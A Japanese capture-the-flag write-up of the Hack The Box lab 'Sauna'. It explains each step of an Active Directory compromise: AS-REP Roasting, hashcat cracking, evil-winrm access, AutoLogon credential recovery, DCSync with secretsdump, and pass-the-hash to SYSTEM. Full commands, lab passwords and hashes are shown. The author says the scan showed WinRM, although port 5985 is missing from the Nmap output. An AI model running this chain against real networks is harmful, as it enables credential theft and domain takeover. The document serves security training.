---
title: "[ HTB ] Sauna | Writeup"
emoji: "🧖"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、HTTP/SMB/Kerberosなどのプロトコルについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: Sauna
Difficulty: Easy
OS: Windows

https://app.hackthebox.com/machines/Sauna

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# echo 'export RHOSTS="10.10.10.175"' | tee -a .zshrc
export RHOSTS="10.10.10.175"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# ping -c 4 ${RHOSTS}
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=142 ms
64 bytes from 10.10.10.175: icmp_seq=2 ttl=127 time=140 ms
64 bytes from 10.10.10.175: icmp_seq=3 ttl=127 time=139 ms
64 bytes from 10.10.10.175: icmp_seq=4 ttl=127 time=141 ms

--- 10.10.10.175 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 139.421/140.635/142.113/0.983 ms
```

## Enumeration

### Nmap

まずはNmapでポートスキャン、兎にも角にもNmap。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nmap -sSV -Pn -n -r -T4 -oN nmap_top1000.txt ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 21:12 +0000
Nmap scan report for 10.10.10.175
Host is up (0.14s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-11 21:19:42Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.47 seconds
```

`-sSV`: SYNスキャン＋Versionスキャン  
`-Pn`: Pingチェック無効化  
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る  
`-n`: 名前解決無効化。同じく時短目的  
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み  
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い  
`-T4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短  
`-oN`: 結果を保存するファイル名を指定  

---

> 389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)

ドメイン名として`EGOTISTICAL-BANK.LOCAL`を持っているDCらしいので`/etc/hosts`に追加しておく。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# echo "${RHOSTS} sauna.egotistical-bank.local egotistical-bank.local" | tee -a /etc/hosts
10.10.10.175 sauna.egotistical-bank.local egotistical-bank.local
```

### LDAP

> 389/tcp  open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)

ADのDCと分かったので、まずはLDAPに匿名でバインド出来るかを確認してみる。

::::details LDAPとは？
読み方: エルダップ

正式名称: Lightweight Directory Access Protocol

意味: ディレクトリサービスに対し検索・参照などの諸々のやり取りをする際に使用するプロトコル/サービス。

Windows環境ならActive Directory(AD)、Linux環境ならOpenLDAPが主流。
::::

:::details 匿名バインドとは？
別名: Anonymous Bind

ユーザ名・PW無しでLDAPサーバに接続し、中の情報を取得出来る機能。

本来はデフォルトで無効になっている。
:::

列挙は`nxc`[^1]で行う。

:::details nxcとは？
読み方: ネットエクスキュート

正式名称: NetExec

意味: SMB/LDAP/WinRMなどのプロトコルに対し認証試行・情報列挙・コマンド実行をいい感じにやってくれるツール群。`CrackMapExec`の後継。
:::

匿名バインドで接続出来るかを試す。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nxc ldap ${RHOSTS} -u '' -p ''
LDAP        10.10.10.175    389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.10.10.175    389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
```

> [+] EGOTISTICAL-BANK.LOCAL\:

末尾の`[+]`は匿名バインド成功を示す。中身を覗けないかを試す。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nxc ldap ${RHOSTS} -u '' -p '' --users
LDAP        10.10.10.175    389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.10.10.175    389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
LDAP        10.10.10.175    389    SAUNA            [-] Error executing command: Error occurs while querying LDAP server:  invalidCredentials - 80090308: LdapErr: DSID-0C09094C, comment: AcceptSecurityContext error, data 52e, v4563
```

バインド自体は通ったものの、ユーザ列挙はクレデンシャル不足で弾かれた。Impacket[^2]の`GetADUsers.py`でも同様に、認証無しだと情報を取り切れない。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# impacket-GetADUsers -dc-ip ${RHOSTS} -no-pass egotistical-bank.local/
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] [Errno Connection error (sauna.egotistical-bank.local:88)] [Errno -2] Name or service not known
```

:::message
匿名バインドは本来無効化されているが、設定不備により有効化されていた。認可範囲が狭く、そのままでは中身を列挙出来なかったが、「ドメイン情報を外部から見られる」という状態そのものが設定不備の脆弱性にあたる。
:::

### SMB

> 445/tcp  open  microsoft-ds?

SMBも匿名で何か見えないか試す。

::::details SMBとは？
読み方: エスエムビー

正式名称: Server Message Block

意味: Windows系ネットワークでファイル共有やプリンタ共有に使われるプロトコル。ADのDCの場合、各種管理情報や共有フォルダを収集する足掛かりとして定番の攻撃対象。
::::

共有フォルダ一覧を取得してみる。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nxc smb ${RHOSTS} -u '' -p '' --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

NULLセッションでの接続までは通るが、共有一覧は弾かれる。SMB側からの手掛かりは一旦諦めてWeb側を見にいく。

### Web

> 80/tcp   open  http         Microsoft IIS httpd 10.0

ブラウザで`http://${RHOSTS}/`にアクセスすると、`Egotistical Bank`という銀行のサイトが表示される。

:::details なぜWebを掘ることにしたのか
LDAP/SMBの匿名列挙で有効な情報が取れなかったため。

ADマシンでクレデンシャルが0の場合、ユーザ名の種を取るための定番ルートは
- 公開Webサイトの「About」「Team」「Blog」などから従業員のフルネームを拾う
- そのフルネームからユーザ名パターンを機械的に生成する
- AS-REP Roastingやパスワードスプレーを仕掛ける

という流れ。まずはWebサイト上に個人名が落ちていないかを探す。
:::

`about.html`を眺めていると、Teamセクションに銀行員のフルネームが並んでいる。

```:about.htmlから拾ったフルネーム
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

ユーザ名の種として控えておく。

## Foothold

### ユーザ名パターン生成

フルネームからWindows ADで使われがちなユーザ名パターン(`first`, `flast`, `first.last`, `firstl` など)を機械的に生成する。

:::details なぜ生成が必要か
AD上の実際のアカウント名は、`Fergus Smith`に対して `fergus` / `fsmith` / `fergus.smith` / `fergussmith` / `smith.f` ... と複数パターン考えられる。公開情報から拾えるのはフルネームだけなので、取り得るパターンを総当りで試して的中するものを探す必要がある。
:::

まずはフルネームをテキストファイルに保存。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# cat > fullnames.txt <<EOF
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
EOF
```

ユーザ名パターンの生成は`username-anarchy`[^3] に任せる。

:::details username-anarchyとは？
読み方: ユーザーネーム・アナーキー

意味: フルネームを渡すと、よくあるユーザ名パターンに展開してくれるRubyスクリプト。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# ./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt

┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# cat unames.txt
fergus
fsmith
fergus.smith
ferguss
shaun
scoins
shaun.coins
shaunc
hugo
hbear
hugo.bear
hugob
bowie
btaylor
bowie.taylor
bowiet
sophie
sdriver
sophie.driver
sophied
steven
skerb
steven.kerb
stevenk
```

### AS-REP Roasting

生成したユーザ名リストに対し、Impacketの`GetNPUsers.py`でAS-REP Roastingを仕掛ける。

:::::details impacket-GetNPUsersとは
読み方: インパケット・ゲットエヌピーユーザーズ

意味: AS-REP Roasting用ツール。

ImpacketというAD攻撃用ツール群のうちの一つ。
:::::

::::details AS-REP Roastingとは？
読み方: エーエスレップ・ロースティング

意味: 事前認証(Pre-Authentication)機能が無効に設定されているユーザに対し、PW不要でAS-REPメッセージを引き出し、その中に含まれるPWハッシュ由来の暗号文をオフライン解析する攻撃。

:::details 事前認証機能とは？
Kerberosで、AS-REQ送信時にクライアントが「自分の鍵でタイムスタンプを暗号化したもの」を一緒に送ることで、サーバがその鍵を正しく持っていることを事前に確認する機能。これが無効になっていると、AS-REPが誰からの問い合わせにも返ってしまい、オフライン解析の材料として使えてしまう。

本来はデフォルトで有効。
:::
::::

`-request`付きで実行すると、事前認証無効なユーザが見つかればそのAS-REPハッシュを返す。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# impacket-GetNPUsers egotistical-bank.local/ -dc-ip ${RHOSTS} -no-pass -usersfile unames.txt -format hashcat -outputfile hashes.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User fergus doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:91594ba6f80ebe140dc153a072cc4950$989de8faf575accc7d41017c88688adbfea9a7caed134b87e568d2b84aed95e28ba60373b58576db445c185520738bffd70a5de3617178bb813ea41e5f3d499d03895be2e7a50cc6c637b5785f58201f43922956706145ee4d302483fa24808cc944d6d2da8c6b6f109e7d779d92f7884a6b65fd6b1eb87a2c3927ae85440284d64d92bbd43681f314354b194895a8dfc59d909a253ebe633065c05cce2178e97e39803a42621b787fc42de720870856598241b23307e8e87a95664991ee6890272179e7321b1224d04199e0bdc87f0196b58f83e0d5dc265c9ccab7d2ec466ed224a97f2d31fdb2a21db61b4d5bed6dfaefa86c09aee927275883f5f8143506
[-] User fergus.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fergussmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
```

`-no-pass`: PW入力をせずに接続する  
`-usersfile`: AS-REP Roasting対象のユーザ名が記載されたファイルを指定  
`-format hashcat`: 後ほどhashcatに食わせるので出力フォーマットを指定  
`-outputfile`: 結果の保存先ファイルを指定  

---

> $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:91594ba6...

`fsmith`ユーザが事前認証無効で、AS-REPハッシュが返ってきた。該当ハッシュのみ`fsmith.hash`に抽出。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# grep '^\$krb5asrep' hashes.txt > fsmith.hash
```

:::message
`fsmith`のアカウントで事前認証(Pre-Authentication)が無効化されていた。これは「KerberosのDoNotRequirePreauthが有効なアカウント」であり、設定不備の脆弱性にあたる。この結果、オフラインでのPW解析が可能な材料(AS-REPハッシュ)を認証無しで入手出来た。
:::

### Hashcat

`hashcat`[^4] でPWを解析する。AS-REP(etype 23)のモードは`18200`。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:91594ba6f80ebe140dc153a072cc4950$989de8f...:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
...
```

`-m 18200`: モード指定(Kerberos 5 AS-REP etype 23)  

`fsmith`のPWが`Thestrokes23`と判明。クレデンシャルが取れたので控えておく。

```txt:creds.txt
fsmith:Thestrokes23
```

### WinRM

5985/tcpではなく、Nmapログの通りマシンではWinRMが有効なため、`fsmith`で接続出来るかを試す。

:::details WinRMとは？
読み方: ウィンアールエム

正式名称: Windows Remote Management

意味: WindowsをSSHライクに遠隔管理するためのプロトコル。管理系の権限を持つユーザが使うことが多く、ADマシンでは侵入の足掛かりとして狙われがち。
:::

まずは`nxc`でクレデンシャルの有効性と、`Remote Management Users`グループ所属かを一括確認。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nxc winrm ${RHOSTS} -u fsmith -p 'Thestrokes23'
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

> [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

`Pwn3d!`はWinRMでコマンド実行権限を持つことを意味する。`evil-winrm`[^5] で対話シェルに入る。

:::details evil-winrmとは？
読み方: イービル・ウィンアールエム

意味: WinRM経由でWindowsマシンに対話シェルを張るためのツール。ファイルのアップロード/ダウンロードも1コマンドで出来るので攻撃者視点では便利。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# evil-winrm -i ${RHOSTS} -u fsmith -p 'Thestrokes23'

Evil-WinRM shell v3.5
...
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotistical-bank\fsmith
```

無事に`fsmith`としてシェルを掌握。デスクトップから`user.txt`を取得。

```sh
*Evil-WinRM* PS C:\Users\FSmith\Documents> type ..\Desktop\user.txt
```

:::message
AS-REP Roastingによってオフラインでクラック可能なハッシュを取得し、`rockyou.txt`に含まれる弱いPWを使い回していた`fsmith`アカウントを掌握出来た。これは「Kerberos事前認証の無効化(設定不備)」と「推測可能な弱いPW」の組み合わせで成立した侵害。
:::

## Privilege Escalation

### Get to svc_loanmgr

Foothold後の列挙は`WinPEAS`[^6] に任せる。

:::details WinPEASとは？
読み方: ウィンピース

意味: Windows向けの権限昇格経路列挙ツール。AutoLogon設定、資格情報マネージャ、スケジュールタスク、脆弱サービスなどを一通り舐めてくれる。
:::

攻撃用マシン側でHTTPサーバを立て、`evil-winrm`の`upload`コマンドで送り込んで実行する。

```sh
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /opt/PEASS/winPEASx64.exe
...
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe
...
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName    :    EGOTISTICALBANK
    DefaultUserName      :    EGOTISTICALBANK\svc_loanmanager
    DefaultPassword      :    Moneymakestheworldgoround!
...
```

> DefaultUserName  :  EGOTISTICALBANK\svc_loanmanager  
> DefaultPassword  :  Moneymakestheworldgoround!

レジストリに平文で保存されたAutoLogon用のクレデンシャルを拾えた。

:::details AutoLogonとは？
Windowsを再起動したときに自動的にログオンするためのレジストリ設定(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`)。有効化すると、ログオン対象のユーザ名/PWが平文でレジストリに格納されるため、ローカルシェルを取っていれば読まれてしまう。
:::

ただし、`WinPEAS`が吐いた`svc_loanmanager`はドメイン上の実際のアカウント名とは微妙に違う可能性がある(AutoLogonの表示用名称と実アカウント名が食い違うケース)。`C:\Users`配下を見ておく。

```sh
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir C:\Users

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/25/2020   1:05 PM                Administrator
d-----          1/23/2020   9:52 AM                FSmith
d-r---          1/22/2020   9:32 AM                Public
d-----          1/24/2020   4:05 PM                svc_loanmgr
```

実在するアカウントは`svc_loanmgr`。`nxc`でクレデンシャルを噛み合わせてみる。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nxc winrm ${RHOSTS} -u svc_loanmgr -p 'Moneymakestheworldgoround!'
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

ビンゴ、こちらも`Pwn3d!`。クレデンシャルを更新。

```txt:creds.txt
fsmith:Thestrokes23
svc_loanmgr:Moneymakestheworldgoround! // new!
```

`evil-winrm`で`svc_loanmgr`としてシェルを張り直す。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# evil-winrm -i ${RHOSTS} -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v3.5
...
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotistical-bank\svc_loanmgr
```

:::message
AutoLogon用のクレデンシャルがレジストリに平文で保存されていた(認証情報の不適切な管理)。この結果、`fsmith`で取れたシェルから更に`svc_loanmgr`サービスアカウントへの横展開(Lateral Movement)が成立した。
:::

### Get to Administrator

次は`svc_loanmgr`から何を狙えるかを整理する必要がある。AD上の権限関係を可視化するために`BloodHound`[^7] を使う。

:::details BloodHoundとは？
読み方: ブラッドハウンド

意味: ADの各種オブジェクト(ユーザ・グループ・コンピュータなど)と、それらの間にある権限/所属関係をグラフとして可視化し、攻撃経路を自動で見つけてくれるツール。収集はIngestorが、可視化はneo4jを裏で使ったGUIが担当する。
:::

収集側は、Linuxから単体で動く`bloodhound-python`[^8] を使う。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d egotistical-bank.local -ns ${RHOSTS} -c All --zip
INFO: Found AD domain: egotistical-bank.local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
...
INFO: Done in 00M 19S
INFO: Compressing output into 20261011211234_bloodhound.zip
```

`-c All`: 全収集モジュールを有効化  
`--zip`: 出力JSONをまとめてzipに固める  

収集したzipをBloodHound GUI(`neo4j console` → `bloodhound`)にドラッグ&ドロップで食わせ、Analysisタブの`Find Principals with DCSync Rights`を叩く。

結果、`SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`→`EGOTISTICAL-BANK.LOCAL`に向かって`GetChangesAll`エッジが生えていた。

```
SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL --(GetChangesAll)--> EGOTISTICAL-BANK.LOCAL
                                   --(GetChanges)-----> EGOTISTICAL-BANK.LOCAL
```

:::details GetChanges / GetChangesAllとは？
ドメインオブジェクトに対する拡張権限で、合わせて持っていると「ドメイン内の全ユーザのPWハッシュを含むディレクトリ複製要求を送信出来る」状態になる。DC間のレプリケーションのために本来はDC自身とDomain Controllersグループなどに付与される権限で、サービスアカウントが持っているのは明らかに過剰。
:::

これはDCSyncが撃てる状態、ということ。

:::details DCSync攻撃とは？
読み方: ディーシーシンク攻撃

意味: 「DCと同じ振る舞い」でレプリケーション要求を送り、ドメイン全ユーザのNTLMハッシュをDCから引き出す攻撃。`Replicating Directory Changes` / `Replicating Directory Changes All`の2権限を持つプリンシパルから発射可能。
:::

攻撃のシナリオを整理する。

1. `svc_loanmgr`の権限で`secretsdump.py`を使い、DCSyncで`Administrator`のNTLMハッシュをダンプ
2. 取れたハッシュをそのまま使い、Pass-the-HashでAdministratorとしてWindowsにログイン(`nxc smb -H` / `psexec.py -hashes`)
3. `root.txt`を取得

#### DCSync で Administrator ハッシュをダンプ

Impacketの`secretsdump.py`で`-just-dc-user Administrator`を指定し、`Administrator`のハッシュだけを引き抜く。

:::details impacket-secretsdumpとは？
読み方: インパケット・シークレッツダンプ

意味: SAM/LSA/NTDS.dit等からクレデンシャル(NTLMハッシュ、Kerberosキー、平文PWなど)を抜くためのツール。DCSync経由のダンプにも対応。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# impacket-secretsdump 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!'@${RHOSTS} -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:...
Administrator:aes128-cts-hmac-sha1-96:...
Administrator:des-cbc-md5:...
[*] Cleaning up...
```

`-just-dc-user Administrator`: 対象ユーザのみに絞ってダンプ  

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::

`:`で区切られた右から2番目(`d9485863c1e9e05851aa40cbb4ab9dff`)が`Administrator`のNTハッシュ。クレデンシャルに追加。

```txt:creds.txt
fsmith:Thestrokes23
svc_loanmgr:Moneymakestheworldgoround!
Administrator:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff // new!
```

#### Pass-the-Hash

NTハッシュがあれば、平文PWなしでそのまま認証出来る(Pass-the-Hash)。

:::details Pass-the-Hashとは？
読み方: パス・ザ・ハッシュ

意味: 平文PWではなくNTLMハッシュそのものを認証材料として使い、SMB/WinRM等でログインする手法。Kerberosは使わずNTLM認証経路に流す。
:::

まずは`nxc`で有効性を確認。

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# nxc smb ${RHOSTS} -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff (Pwn3d!)
```

`(Pwn3d!)`も付いたので、Impacketの`psexec.py`でSYSTEM権限の対話シェルを張る。

:::details impacket-psexecとは？
読み方: インパケット・ピーエスエグゼック

意味: SMB経由でリモートWindows上に一時的なサービスを登録→起動し、`NT AUTHORITY\SYSTEM`権限で対話シェルを得るツール。SysinternalsのPsExecをImpacketで再実装したもの。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Sauna]
└─# impacket-psexec -hashes :d9485863c1e9e05851aa40cbb4ab9dff egotistical-bank.local/Administrator@${RHOSTS}
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service ... on 10.10.10.175.....
[*] Starting service ... on 10.10.10.175.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

`-hashes :<NTハッシュ>`: Pass-the-Hashで認証  

Pwn3d!

`root.txt`を取得。

```sh
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

:::message
サービスアカウント`svc_loanmgr`に対してDCレプリケーション相当の権限(`DS-Replication-Get-Changes-All`)が過剰に付与されていた。これは最小権限の原則違反(権限設定の不備)にあたる。この結果、`Administrator`を含む全ドメインユーザのNTハッシュをオフライン無しで引き抜けてしまい、Pass-the-Hashで即座にSYSTEM権限が奪取された。
:::

## まとめ

改めて攻撃チェーンを整理すると以下の通り。

1. Nmapで`EGOTISTICAL-BANK.LOCAL`ドメインのDCと特定し、匿名LDAP/SMBから情報収集を試みるも空振り
2. 80/httpの銀行サイト`about.html`から銀行員6名のフルネームを収集
3. `username-anarchy`でユーザ名パターンを総当り生成し、ASREPRoastingで`fsmith`のAS-REPハッシュを入手
4. `hashcat`+`rockyou.txt`で`fsmith`のPW(`Thestrokes23`)をクラック
5. WinRM経由で`fsmith`としてログイン(user.txt)
6. `WinPEAS`でAutoLogonレジストリに平文保存された`svc_loanmgr`のPW(`Moneymakestheworldgoround!`)を回収し、横展開
7. `bloodhound-python`+BloodHoundで`svc_loanmgr`が`GetChangesAll`権限を持つことを確認し、DCSync経路を特定
8. `secretsdump.py`でDCSyncを撃ち、`Administrator`のNTハッシュをダンプ
9. そのハッシュを使い`psexec.py`でPass-the-HashしてSYSTEMシェル奪取(root.txt)

ADのEasyマシンでよく出るパターン(匿名列挙 → ASREPRoasting → AutoLogon漏えい → DCSync)が一直線に繋がっていて、各フェーズが教科書的に綺麗に通る良マシンだった。
`WinPEAS`の出力に出てきた`svc_loanmanager`と実アカウント名`svc_loanmgr`の食い違いにはちょっと引っかけられかけたが、`C:\Users`を見るだけで気付ける範囲なので、面倒がらずに実在するアカウントを確認する癖は大事だな、と改めて感じた。

ちなみにHTBなのでやらないですが、実務では後始末もやっています。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^1]: https://github.com/Pennyw0rth/NetExec
[^2]: https://github.com/fortra/impacket
[^3]: https://github.com/urbanadventurer/username-anarchy
[^4]: https://hashcat.net/hashcat/
[^5]: https://github.com/Hackplayers/evil-winrm
[^6]: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
[^7]: https://github.com/BloodHoundAD/BloodHound
[^8]: https://github.com/dirkjanm/BloodHound.py
